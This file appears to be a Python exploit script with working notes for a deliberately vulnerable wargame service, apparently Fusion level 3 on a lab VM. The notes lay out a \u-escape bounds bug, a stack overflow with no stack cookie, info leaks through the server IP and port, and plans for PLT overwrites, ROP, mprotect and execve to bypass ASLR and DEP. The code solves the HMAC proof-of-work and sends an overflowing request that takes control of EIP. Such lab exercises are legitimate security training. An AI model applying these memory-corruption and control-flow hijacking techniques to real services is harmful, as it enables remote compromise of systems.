PORT = 20003
FUSION_IP = "192.168.180.128"
import socket
import string
import telnetlib
import struct
import time
import select
import hmac

#exploit:
# There is a server
# TODO: understand the signal() call on main()
# 1. we get a token
# 2. the request is being read... in\out\err fd are being closed! :(
# ^ exploit will be harder... payload needs more logics

# 3. request is being validated... H-MAC_sha1 with token() as key.
# request should be sent with {token} at first.
# HMAC_val of the first 2 bytes should be 0... 16 bits of Proof of Work.

# 4. parse_request() -> loads as json_object :)

# 5. handle_request()
### TAGS
### there is an array for tags...
### tags could be added freely... !! Memory Corruption :)
### tags value should be a long array...
### THERE ARE 2 WAYS OF CORRUPTION
### One-> using tags as an array...
### Two-> sending multiple tags keys

### TITLE
### decode_string is being called on title_value and is saved on title_buffer which is 128 bytes long
### after that a buffer in the correct size is being allocated and title is stored there.
### NO ONE FREES THESE TITLES...

### CONTENTS
### EXACTLY AS TITLE BUT BUFFER IS 1024 bytes long 
### GOOD FOR PUTTING A PAYLOAD :)

### SERVERIP
### overwrites the gServerIP 


###### DECODE_STRING
###### copies bytes unless escaped string (\)
###### \" \\ \/ is copyied regularly...
###### \b, \f, \n, \r, \t is copied in the format "\x"
##### \b is backspace... 

###### \u copies 4 bytes and convert to int
###### adds to src += 4 without checking bounds :)
###### I COULD EASILY END MY STRING with \u 
###### WHAT IS GOING TO BE THE NEXT DATA being PARSED?
###### I CAN USE THAT TO LEAK DATA :)

#### dest is being increased twice so dest > end and while loop keeps forever (untill *src is NULL)
#### I CAN OVERWRITE AFTER title :)
#### THERE IS NO STACK_COOKIE 

# 6. post_blog_article
# sends an HTTP POST REQUEST to IP:80 with title and content 
# COULD WE FIND AN INFO LEAK???
# WHAT HAPPEND IF NO content/title tag was set EARLIER?
# ANSWER: if(! gServerIP || !gContents || !gTitle) return;
# so how do we leak?!
### USING \\\u AS THE LAST BYTE OF THE ENCODED STRING... THIS WILL CAUSE DEST > END and BYPASS THE CHECK :)
### ANOTHER LEAKEAGE IS USING PORT :) SENDING IP LIKE THIS: ip: WILL CAUSE THE SERVER TO SEND A POST MESSAGE TO ARBITRARY PORT... SNIFFING IT WILL REVEAL DATA :)


#### stack address needs to be leaked (our data)
#### heap address needs to be leaked (our data copy)
#### libc address needs to be leaked (calling dup2() mprotect() and execve()) might be unneccessary with plt :)
#### nwrite address should be overwritten in plt
#### TODO: is PLT writable?
#### SOLUTION: should be since exploit-exercises told: Read only relocations    No
#### to a payload the uses dup2() with the first parameter and 0, 1, 2
#### and then calls execve() with the parameters :)
#### problem: DEP
#### SOLUTION: calling mprotect on our data 
#### problem: libc__execve(), libc__mprotect()
#### SOLUTIONs:
    # libc leakage...
    # another exploitation like storing .ssh keys :(

### ANOTHER HEAP OVERFLOW
###  POST IS 1024*128 BYTES
### gServerIP could be anything :)


# EXPLOIT IDEA1:
    # SO I HAVE AN EIP OVERWRITE PRIMITIVE!!
    # I CAN CALL PLT FUNCTIONS BUT THE COOL ONE ARE NOT THERE
    # I NEED TO LEAK AN ADDRESS
    # I WILL PUT IT ON gContent so it will be sent to me 
    # IT'S NICE SINCE GLOBAL VARIABLE ARE ON .bss segment AND WON'T GET ASLR
    ## SO I WILL SET EIP-> MEMCPY()
    # COPY TO gContent the value of ....
    # LIBC :)
    # THIS WILL BE DONE TO BREAK THE ASLR OF LIBC :)
    # SINCE THE PLT POINTS TO LIBC and PLT is at EXACT LOCATION I CAN LEAK THE LIBC ADDRESS :)
    # AFTER THAT I WILL USE THE SAME TRICK TO OVERWRITE EIP WITH THE ADDRESS OF execve()
    # I WILL NEED TO PUT DATA ON STACK... THIS WILL BE DONE WITH THE SAME TRICK OF LEVEL2
    # FINDING A RW FIXED LOCATION SETTING ESP -> RW_FIXED_LOCATION
    # USING MEMCPY TO WRITE THERE :)
#
# EXPLOIT IDEA2:
    ### OVERWRITING PLT offsets...
    ### find an inimportant function
    ### change it's offset since it's fixed! using ROP GADGETS :)
    ### now just call it from unimporant@plt :)
    ### system() is nice function for the mission :)


MY_IP = "192.168.74.1"
gContents = 0x0804BDF4
MEMCPY = 0x08048E60
RW_FIXED_LOCATION = 0
PTR_TO_LIBC = MEMCPY # IT IS ON A SPEICIF OFFSET FROM VICTIM'S LIBC


def proof_of_work(token, req):
    print "working..."
    import hashlib
    POWERS_OF_TWO = [2**i for i in xrange(20)]
    i = 0
    new_req = token + req
    hmac_res = hmac.new(token, new_req.replace("NONCEVAL", str(i)), hashlib.sha1).digest()
    print hmac_res.encode('hex')
    while ord(hmac_res[0]) | ord(hmac_res[1]) != 0:
        i += 1
        hmac_res = hmac.new(token, token + req + str(i), hashlib.sha1).digest()
        if i in POWERS_OF_TWO:
            print i,
        if i > POWERS_OF_TWO[-1]:
            print "failed... 4 bits of bad luck"
            break
    print "work is done :)", i
    return new_req + str(i)

s = socket.socket()
s.connect((FUSION_IP, PORT))
token = s.recv(4096)
token = token.replace("\"","").replace("\n","")
print "got token", token
req_prefix = "\n{"
req_suffix = "}"
tags = (16) * ["pwn"]
req = ' \
        "title" : "{title}", \
        "tags" : {tags},\
        "contents" : "{contents}", \
        "nonce" : "NONCEVAL",\
        "serverip" : "{ip}" \
        '.format(tags=str(tags), ip=MY_IP, title="C" * 127 + "\\\u" + "B" * 35 + "CCCC" + "D" * 500, contents="B")

full_req = req_prefix + req + req_suffix
new_req = proof_of_work(token, full_req)
print "sending", new_req
s.send(new_req)


"""

OVERWRITE handle_request ret_address -> SET_EIP=0x43434343... :)
req = ' \
        "title" : "{title}", \
        "tags" : {tags},\
        "contents" : "{contents}", \
        "nonce" : "NONCEVAL",\
        "serverip" : "{ip}" \
        '.format(tags=str(tags), ip=MY_IP, title="C" * 127 + "\\\u" + "B" * 35 + "CCCC", contents="B")



OVERWRITE handle_request ret_address -> SET_EIP=0x42424242... :)
req = ' \
        "title" : "{title}", \
        "tags" : {tags},\
        "contents" : "{contents}", \
        "nonce" : "NONCEVAL",\
        "serverip" : "{ip}" \
        '.format(tags=str(tags), ip=MY_IP, title="C" * 127 + "\\\u" + "B" * 1024, contents="B")
"""